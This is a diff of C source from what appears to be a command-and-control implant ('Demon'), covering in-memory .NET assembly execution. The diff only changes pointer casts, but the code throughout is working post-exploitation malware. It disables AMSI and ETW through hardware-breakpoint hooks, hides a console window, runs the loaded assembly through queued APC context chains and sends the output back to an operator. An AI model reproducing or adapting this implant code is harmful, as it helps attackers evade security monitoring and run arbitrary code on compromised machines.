@@ -34,8 +34,8 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         return FALSE;
 
     /* Create a named pipe for our output. try with anon pipes at some point. */
-    Instance->Dotnet->Pipe = Instance->Win32.CreateNamedPipeW(
-        Instance->Dotnet->PipeName.Buffer,
+    ((INSTANCE *)Instance)->Dotnet->Pipe = ((INSTANCE *)Instance)->Win32.CreateNamedPipeW(
+        ((INSTANCE *)Instance)->Dotnet->PipeName.Buffer,
         PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE,
         PIPE_TYPE_MESSAGE,
         PIPE_UNLIMITED_INSTANCES,
@@ -44,7 +44,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         NULL
     );
 
-    if ( ! Instance->Dotnet->Pipe )
+    if ( ! ((INSTANCE *)Instance)->Dotnet->Pipe )
     {
         PRINTF( "CreateNamedPipeW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
@@ -52,7 +52,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         return FALSE;
     }
 
-    if ( ! ( Instance->Dotnet->File = Instance->Win32.CreateFileW( Instance->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
+    if ( ! ( ((INSTANCE *)Instance)->Dotnet->File = ((INSTANCE *)Instance)->Win32.CreateFileW( ((INSTANCE *)Instance)->Dotnet->PipeName.Buffer, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ) ) )
     {
         PRINTF( "CreateFileW Failed: Error[%d]\n", NtGetLastError() )
         PACKAGE_ERROR_WIN32;
@@ -60,41 +60,41 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         return FALSE;
     }
 
-    if ( ! Instance->Win32.GetConsoleWindow( ) )
+    if ( ! ((INSTANCE *)Instance)->Win32.GetConsoleWindow( ) )
     {
         HWND wnd = NULL;
 
-        Instance->Win32.AllocConsole( );
+        ((INSTANCE *)Instance)->Win32.AllocConsole( );
 
-        if ( ( wnd = Instance->Win32.GetConsoleWindow( ) ) )
-            Instance->Win32.ShowWindow( wnd, SW_HIDE );
+        if ( ( wnd = ((INSTANCE *)Instance)->Win32.GetConsoleWindow( ) ) )
+            ((INSTANCE *)Instance)->Win32.ShowWindow( wnd, SW_HIDE );
     }
 
     //
     // hosting common language runtime
     //
     if ( ! ClrCreateInstance(
-        Instance->Dotnet->NetVersion.Buffer,
-        & Instance->Dotnet->MetaHost,
-        & Instance->Dotnet->ClrRuntimeInfo,
-        & Instance->Dotnet->ICorRuntimeHost
+        ((INSTANCE *)Instance)->Dotnet->NetVersion.Buffer,
+        & ((INSTANCE *)Instance)->Dotnet->MetaHost,
+        & ((INSTANCE *)Instance)->Dotnet->ClrRuntimeInfo,
+        & ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost
     ) ) {
         PUTS( "Couldn't start CLR" )
         return FALSE;
     }
 
     /* if Amsi/Etw bypass is enabled */
-    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
+    if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP )
     {
 #if _WIN64
         PUTS( "Try to patch(less) Amsi/Etw" )
 
-        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
+        PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, ((INSTANCE *)Instance)->Dotnet->RequestID );
         PackageAddInt32( PackageInfo, DOTNET_INFO_PATCHED );
 
         /* check if Amsi is loaded */
         AmsiIsLoaded = TRUE;
-        if ( ! Instance->Modules.Amsi ) {
+        if ( ! ((INSTANCE *)Instance)->Modules.Amsi ) {
             AmsiIsLoaded = RtAmsi();
         }
 
@@ -104,13 +104,13 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             return FALSE;
         }
 
-        ThreadId = U_PTR( Instance->Teb->ClientId.UniqueThread );
+        ThreadId = U_PTR( ((INSTANCE *)Instance)->Teb->ClientId.UniqueThread );
 
         /* add Amsi bypass */
         if ( AmsiIsLoaded )
         {
             PUTS( "HwBp Engine add AmsiScanBuffer bypass" )
-            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, Instance->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
+            if ( ! NT_SUCCESS( Status = HwBpEngineAdd( NULL, ThreadId, ((INSTANCE *)Instance)->Win32.AmsiScanBuffer, HwBpExAmsiScanBuffer, 0 ) ) ) {
                 PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
                 return FALSE;
             }
@@ -118,7 +118,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
 
         /* add Etw bypass */
         PUTS( "HwBp Engine add NtTraceEvent bypass" )
-        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, Instance->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
+        if ( ! NT_SUCCESS( HwBpEngineAdd( NULL, ThreadId, ((INSTANCE *)Instance)->Win32.NtTraceEvent, HwBpExNtTraceEvent, 1 ) ) ) {
             PRINTF( "Failed adding exception to HwBp Engine: %08x\n", Status )
             return FALSE;
         }
@@ -127,7 +127,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
         PackageInfo = NULL;
 #endif
     }
-    else if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
+    else if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_MEMORY ) {
         /* todo: add memory patching technique */
     }
     else {
@@ -135,29 +135,29 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     }
 
     /* Let the operator know what version we are going to use. */
-    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, Instance->Dotnet->RequestID );
+    PackageInfo = PackageCreateWithRequestID( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE, ((INSTANCE *)Instance)->Dotnet->RequestID );
     PackageAddInt32( PackageInfo, DOTNET_INFO_NET_VERSION );
-    PackageAddBytes( PackageInfo, Instance->Dotnet->NetVersion.Buffer, Instance->Dotnet->NetVersion.Length );
+    PackageAddBytes( PackageInfo, ((INSTANCE *)Instance)->Dotnet->NetVersion.Buffer, ((INSTANCE *)Instance)->Dotnet->NetVersion.Length );
     PackageTransmit( PackageInfo );
     PackageInfo = NULL;
 
     RgsBound[ 0 ].cElements    = Assembly.Length;
     RgsBound[ 0 ].lLbound      = 0;
-    Instance->Dotnet->SafeArray = Instance->Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );
+    ((INSTANCE *)Instance)->Dotnet->SafeArray = ((INSTANCE *)Instance)->Win32.SafeArrayCreate( VT_UI1, 1, RgsBound );
 
     PUTS( "CreateDomain..." )
-    if ( ( Result = Instance->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( Instance->Dotnet->ICorRuntimeHost, Instance->Dotnet->AppDomainName.Buffer, NULL, &Instance->Dotnet->AppDomainThunk ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost->lpVtbl->CreateDomain( ((INSTANCE *)Instance)->Dotnet->ICorRuntimeHost, ((INSTANCE *)Instance)->Dotnet->AppDomainName.Buffer, NULL, &((INSTANCE *)Instance)->Dotnet->AppDomainThunk ) ) ) {
         PRINTF( "CreateDomain Failed: %x\n", Result )
         return FALSE;
     }
 
     PUTS( "QueryInterface..." )
-    if ( ( Result = Instance->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( Instance->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&Instance->Dotnet->AppDomain ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->AppDomainThunk->lpVtbl->QueryInterface( ((INSTANCE *)Instance)->Dotnet->AppDomainThunk, &xIID_AppDomain, (LPVOID*)&((INSTANCE *)Instance)->Dotnet->AppDomain ) ) ) {
         PRINTF( "QueryInterface Failed: %x\n", Result )
         return FALSE;
     }
 
-    if ( ( Result = Instance->Win32.SafeArrayAccessData( Instance->Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayAccessData( ((INSTANCE *)Instance)->Dotnet->SafeArray, &AssemblyData.Buffer ) ) ) {
         PRINTF( "SafeArrayAccessData Failed: %x\n", Result )
         return FALSE;
     }
@@ -165,53 +165,53 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     PUTS( "Copy assembly to buffer..." )
     MemCopy( AssemblyData.Buffer, Assembly.Buffer, Assembly.Length );
 
-    if ( ( Result = Instance->Win32.SafeArrayUnaccessData( Instance->Dotnet->SafeArray ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayUnaccessData( ((INSTANCE *)Instance)->Dotnet->SafeArray ) ) ) {
         PRINTF("SafeArrayUnaccessData Failed: %x\n", Result )
         PACKAGE_ERROR_WIN32
     }
 
     PUTS( "AppDomain Load..." )
-    if ( ( Result = Instance->Dotnet->AppDomain->lpVtbl->Load_3( Instance->Dotnet->AppDomain, Instance->Dotnet->SafeArray, &Instance->Dotnet->Assembly ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->AppDomain->lpVtbl->Load_3( ((INSTANCE *)Instance)->Dotnet->AppDomain, ((INSTANCE *)Instance)->Dotnet->SafeArray, &((INSTANCE *)Instance)->Dotnet->Assembly ) ) ) {
         PRINTF( "AppDomain Failed: %x\n", Result )
         return FALSE;
     }
 
     PUTS( "Assembly EntryPoint..." )
-    if ( ( Result = Instance->Dotnet->Assembly->lpVtbl->EntryPoint( Instance->Dotnet->Assembly, &Instance->Dotnet->MethodInfo ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->Assembly->lpVtbl->EntryPoint( ((INSTANCE *)Instance)->Dotnet->Assembly, &((INSTANCE *)Instance)->Dotnet->MethodInfo ) ) ) {
         PRINTF( "Assembly EntryPoint Failed: %x\n", Result )
         return FALSE;
     }
 
-    Instance->Dotnet->MethodArgs = Instance->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
+    ((INSTANCE *)Instance)->Dotnet->MethodArgs = ((INSTANCE *)Instance)->Win32.SafeArrayCreateVector( VT_VARIANT, 0, 1 ); //Last field -> entryPoint == 1 is needed if Main(String[] args) 0 if Main()
 
-    ArgumentsArray = Instance->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
+    ArgumentsArray = ((INSTANCE *)Instance)->Win32.CommandLineToArgvW( Arguments.Buffer, &ArgumentsCount );
     ArgumentsArray++;
     ArgumentsCount--;
 
-    Instance->Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
-    Instance->Dotnet->vtPsa.parray = Instance->Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
+    ((INSTANCE *)Instance)->Dotnet->vtPsa.vt     = ( VT_ARRAY | VT_BSTR );
+    ((INSTANCE *)Instance)->Dotnet->vtPsa.parray = ((INSTANCE *)Instance)->Win32.SafeArrayCreateVector( VT_BSTR, 0, ArgumentsCount );
 
     for ( LONG i = 0; i < ArgumentsCount; i++ ) {
-        if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->vtPsa.parray, &i, Instance->Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
+        if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayPutElement( ((INSTANCE *)Instance)->Dotnet->vtPsa.parray, &i, ((INSTANCE *)Instance)->Win32.SysAllocString( ArgumentsArray[ i ] ) ) ) ) {
             PRINTF( "Args SafeArrayPutElement Failed: %x\n", Result )
             return FALSE;
         }
     }
 
-    if ( ( Result = Instance->Win32.SafeArrayPutElement( Instance->Dotnet->MethodArgs, idx, &Instance->Dotnet->vtPsa ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Win32.SafeArrayPutElement( ((INSTANCE *)Instance)->Dotnet->MethodArgs, idx, &((INSTANCE *)Instance)->Dotnet->vtPsa ) ) ) {
         PRINTF( "SafeArrayPutElement Failed: %x\n", Result )
             return FALSE;
     }
 
-    Instance->Dotnet->StdOut = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
-    Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE , Instance->Dotnet->File );
+    ((INSTANCE *)Instance)->Dotnet->StdOut = ((INSTANCE *)Instance)->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
+    ((INSTANCE *)Instance)->Win32.SetStdHandle( STD_OUTPUT_HANDLE , ((INSTANCE *)Instance)->Dotnet->File );
 
-    if ( ( Result = Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3( Instance->Dotnet->MethodInfo, Object, Instance->Dotnet->MethodArgs, &Instance->Dotnet->Return ) ) ) {
+    if ( ( Result = ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Invoke_3( ((INSTANCE *)Instance)->Dotnet->MethodInfo, Object, ((INSTANCE *)Instance)->Dotnet->MethodArgs, &((INSTANCE *)Instance)->Dotnet->Return ) ) ) {
         PRINTF( "Invoke Assembly Failed: %x\n", Result )
         return FALSE;
     }
 
-    Instance->Dotnet->Invoked = TRUE;
+    ((INSTANCE *)Instance)->Dotnet->Invoked = TRUE;
 
     /* push output */
     DotnetPush();
@@ -235,56 +235,56 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     ThreadAttr.Length          = sizeof( NT_PROC_THREAD_ATTRIBUTE_LIST );
 
     PUTS( "Creating events..." )
-    if ( NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
-         NT_SUCCESS( Instance->Win32.NtCreateEvent( &Instance->Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
+    if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateEvent( &((INSTANCE *)Instance)->Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
+         NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateEvent( &((INSTANCE *)Instance)->Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
     {
-        if ( NT_SUCCESS( Instance->Win32.NtCreateThreadEx( &Instance->Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
+        if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtCreateThreadEx( &((INSTANCE *)Instance)->Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), ((INSTANCE *)Instance)->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
         {
-            Instance->Dotnet->RopInit = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopInvk = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopEvnt = MmHeapAlloc( sizeof( CONTEXT ) );
-            Instance->Dotnet->RopExit = MmHeapAlloc( sizeof( CONTEXT ) );
+            ((INSTANCE *)Instance)->Dotnet->RopInit = MmHeapAlloc( sizeof( CONTEXT ) );
+            ((INSTANCE *)Instance)->Dotnet->RopInvk = MmHeapAlloc( sizeof( CONTEXT ) );
+            ((INSTANCE *)Instance)->Dotnet->RopEvnt = MmHeapAlloc( sizeof( CONTEXT ) );
+            ((INSTANCE *)Instance)->Dotnet->RopExit = MmHeapAlloc( sizeof( CONTEXT ) );
 
-            Instance->Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
-            if ( NT_SUCCESS( Instance->Win32.NtGetContextThread( Instance->Dotnet->Thread, Instance->Dotnet->RopInit ) ) )
+            ((INSTANCE *)Instance)->Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
+            if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtGetContextThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Dotnet->RopInit ) ) )
             {
-                MemCopy( Instance->Dotnet->RopInvk, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
-                MemCopy( Instance->Dotnet->RopEvnt, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
-                MemCopy( Instance->Dotnet->RopExit, Instance->Dotnet->RopInit, sizeof( CONTEXT ) );
+                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopInvk, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );
+                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopEvnt, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );
+                MemCopy( ((INSTANCE *)Instance)->Dotnet->RopExit, ((INSTANCE *)Instance)->Dotnet->RopInit, sizeof( CONTEXT ) );
 
                 // This rop executes the entrypoint of the assembly
-                Instance->Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
-                Instance->Dotnet->RopInvk->Rip           = U_PTR( Instance->Dotnet->MethodInfo->lpVtbl->Invoke_3 );
-                Instance->Dotnet->RopInvk->Rcx           = U_PTR( Instance->Dotnet->MethodInfo );
-                Instance->Dotnet->RopInvk->Rdx           = U_PTR( &Object );
-                Instance->Dotnet->RopInvk->R8            = U_PTR( Instance->Dotnet->MethodArgs );
-                Instance->Dotnet->RopInvk->R9            = U_PTR( &Instance->Dotnet->Return );
-                *( PVOID* )( Instance->Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->ContextFlags  = CONTEXT_FULL;
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rsp          -= U_PTR( 0x1000 * 6 );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rip           = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodInfo->lpVtbl->Invoke_3 );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodInfo );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->Rdx           = U_PTR( &Object );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->R8            = U_PTR( ((INSTANCE *)Instance)->Dotnet->MethodArgs );
+                ((INSTANCE *)Instance)->Dotnet->RopInvk->R9            = U_PTR( &((INSTANCE *)Instance)->Dotnet->Return );
+                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );
 
                 // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
-                Instance->Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
-                Instance->Dotnet->RopEvnt->Rip           = U_PTR( Instance->Win32.NtSetEvent );
-                Instance->Dotnet->RopEvnt->Rcx           = U_PTR( Instance->Dotnet->Event );
-                Instance->Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
-                *( PVOID* )( Instance->Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
+                ((INSTANCE *)Instance)->Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
+                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rsp          -= U_PTR( 0x1000 * 5 );
+                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rip           = U_PTR( ((INSTANCE *)Instance)->Win32.NtSetEvent );
+                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->Event );
+                ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
+                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );
 
                 // Wait til we freed everything from the dotnet
-                Instance->Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
-                Instance->Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
-                Instance->Dotnet->RopExit->Rip           = U_PTR( Instance->Win32.NtWaitForSingleObject );
-                Instance->Dotnet->RopExit->Rcx           = U_PTR( Instance->Dotnet->Exit );
-                Instance->Dotnet->RopExit->Rdx           = U_PTR( FALSE );
-                Instance->Dotnet->RopExit->R8            = U_PTR( NULL );
-                *( PVOID* )( Instance->Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.NtTestAlert );
+                ((INSTANCE *)Instance)->Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
+                ((INSTANCE *)Instance)->Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
+                ((INSTANCE *)Instance)->Dotnet->RopExit->Rip           = U_PTR( ((INSTANCE *)Instance)->Win32.NtWaitForSingleObject );
+                ((INSTANCE *)Instance)->Dotnet->RopExit->Rcx           = U_PTR( ((INSTANCE *)Instance)->Dotnet->Exit );
+                ((INSTANCE *)Instance)->Dotnet->RopExit->Rdx           = U_PTR( FALSE );
+                ((INSTANCE *)Instance)->Dotnet->RopExit->R8            = U_PTR( NULL );
+                *( PVOID* )( ((INSTANCE *)Instance)->Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( ((INSTANCE *)Instance)->Win32.NtTestAlert );
 
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance->Win32.NtQueueApcThread( Instance->Dotnet->Thread, Instance->Win32.NtContinue, Instance->Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtQueueApcThread( ((INSTANCE *)Instance)->Dotnet->Thread, ((INSTANCE *)Instance)->Win32.NtContinue, ((INSTANCE *)Instance)->Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
 
                 PUTS( "Resume Thread..." )
-                if ( NT_SUCCESS( Instance->Win32.NtAlertResumeThread( Instance->Dotnet->Thread, NULL ) ) )
+                if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.NtAlertResumeThread( ((INSTANCE *)Instance)->Dotnet->Thread, NULL ) ) )
                 {
                     PUTS( "Apc started and assembly invoked." )
 
@@ -294,7 +294,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                     PackageTransmit( PackageInfo );
 
                     // we have successfully invoked the main function of the assembly executable.
-                    Instance->Dotnet->Invoked = TRUE;
+                    ((INSTANCE *)Instance)->Dotnet->Invoked = TRUE;
 
                 } else PUTS( "NtAlertResumeThread failed" )
 
@@ -314,31 +314,31 @@ VOID DotnetPushPipe()
     DWORD Read      = 0;
     DWORD BytesRead = 0;
 
-    if ( ! Instance->Dotnet )
+    if ( ! ((INSTANCE *)Instance)->Dotnet )
         return;
 
     /* see how much there is in the named pipe */
-    if ( Instance->Win32.PeekNamedPipe( Instance->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
+    if ( ((INSTANCE *)Instance)->Win32.PeekNamedPipe( ((INSTANCE *)Instance)->Dotnet->Pipe, NULL, 0, NULL, &Read, NULL ) )
     {
         PRINTF( "Read: %d\n", Read );
 
         if ( Read > 0 )
         {
-            Instance->Dotnet->Output.Length = Read;
-            Instance->Dotnet->Output.Buffer = MmHeapAlloc( Instance->Dotnet->Output.Length );
+            ((INSTANCE *)Instance)->Dotnet->Output.Length = Read;
+            ((INSTANCE *)Instance)->Dotnet->Output.Buffer = MmHeapAlloc( ((INSTANCE *)Instance)->Dotnet->Output.Length );
 
-            Instance->Win32.ReadFile( Instance->Dotnet->Pipe, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length, &BytesRead, NULL );
-            Instance->Dotnet->Output.Length = BytesRead;
+            ((INSTANCE *)Instance)->Win32.ReadFile( ((INSTANCE *)Instance)->Dotnet->Pipe, ((INSTANCE *)Instance)->Dotnet->Output.Buffer, ((INSTANCE *)Instance)->Dotnet->Output.Length, &BytesRead, NULL );
+            ((INSTANCE *)Instance)->Dotnet->Output.Length = BytesRead;
 
-            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, Instance->Dotnet->RequestID );
-            PackageAddBytes( Package, Instance->Dotnet->Output.Buffer, Instance->Dotnet->Output.Length );
+            PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, ((INSTANCE *)Instance)->Dotnet->RequestID );
+            PackageAddBytes( Package, ((INSTANCE *)Instance)->Dotnet->Output.Buffer, ((INSTANCE *)Instance)->Dotnet->Output.Length );
             PackageTransmit( Package );
 
-            if ( Instance->Dotnet->Output.Buffer )
+            if ( ((INSTANCE *)Instance)->Dotnet->Output.Buffer )
             {
-                MemSet( Instance->Dotnet->Output.Buffer, 0, Read );
-                MmHeapFree( Instance->Dotnet->Output.Buffer );
-                Instance->Dotnet->Output.Buffer = NULL;
+                MemSet( ((INSTANCE *)Instance)->Dotnet->Output.Buffer, 0, Read );
+                MmHeapFree( ((INSTANCE *)Instance)->Dotnet->Output.Buffer );
+                ((INSTANCE *)Instance)->Dotnet->Output.Buffer = NULL;
             }
         }
     }
@@ -346,17 +346,17 @@ VOID DotnetPushPipe()
 
 VOID DotnetPush()
 {
-    if ( ! Instance->Dotnet )
+    if ( ! ((INSTANCE *)Instance)->Dotnet )
         return;
 
-    PRINTF( "Instance->Dotnet->Invoked: %s\n", Instance->Dotnet->Invoked ? "TRUE" : "FALSE" )
-    if ( Instance->Dotnet->Invoked )
+    PRINTF( "Instance->Dotnet->Invoked: %s\n", ((INSTANCE *)Instance)->Dotnet->Invoked ? "TRUE" : "FALSE" )
+    if ( ((INSTANCE *)Instance)->Dotnet->Invoked )
     {
         /* Read from the assembly named pipe and send it to the server */
         DotnetPushPipe();
 
         /* check if the assembly is still running. */
-        /* if ( Instance->Win32.WaitForSingleObjectEx( Instance->Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
+        /* if ( ((INSTANCE *)Instance)->Win32.WaitForSingleObjectEx( ((INSTANCE *)Instance)->Dotnet->Event, 0, FALSE ) == WAIT_OBJECT_0 )
         {
             PUTS( "Event has been signaled" )
 
@@ -379,122 +379,122 @@ VOID DotnetPush()
 VOID DotnetClose()
 {
 #ifndef DEBUG
-    Instance->Win32.FreeConsole();
+    ((INSTANCE *)Instance)->Win32.FreeConsole();
 #endif
 
-    if ( Instance->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
+    if ( ((INSTANCE *)Instance)->Config.Implant.AmsiEtwPatch == AMSIETW_PATCH_HWBP ) {
         HwBpEngineDestroy( NULL );
     }
 
-    if ( Instance->Dotnet->Event ) {
-        SysNtClose( Instance->Dotnet->Event );
+    if ( ((INSTANCE *)Instance)->Dotnet->Event ) {
+        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Event );
     }
 
-    if ( Instance->Dotnet->Pipe ) {
-        SysNtClose( Instance->Dotnet->Pipe );
+    if ( ((INSTANCE *)Instance)->Dotnet->Pipe ) {
+        SysNtClose( ((INSTANCE *)Instance)->Dotnet->Pipe );
     }
 
-    if ( Instance->Dotnet->File ) {
-        SysNtClose( Instance->Dotnet->File );
+    if ( ((INSTANCE *)Instance)->Dotnet->File ) {
+        SysNtClose( ((INSTANCE *)Instance)->Dotnet->File );
     }
 
-    if ( Instance->Dotnet->RopInit ) {
-        MemSet( Instance->Dotnet->RopInit, 0, sizeof( CONTEXT ) );
-        Instance->Win32.LocalFree( Instance->Dotnet->RopInit );
-        Instance->Dotnet->RopInit = NULL;
+    if ( ((INSTANCE *)Instance)->Dotnet->RopInit ) {
+        MemSet( ((INSTANCE *)Instance)->Dotnet->RopInit, 0, sizeof( CONTEXT ) );
+        ((INSTANCE *)Instance)->Win32.LocalFree( ((INSTANCE *)Instance)->Dotnet->RopInit );
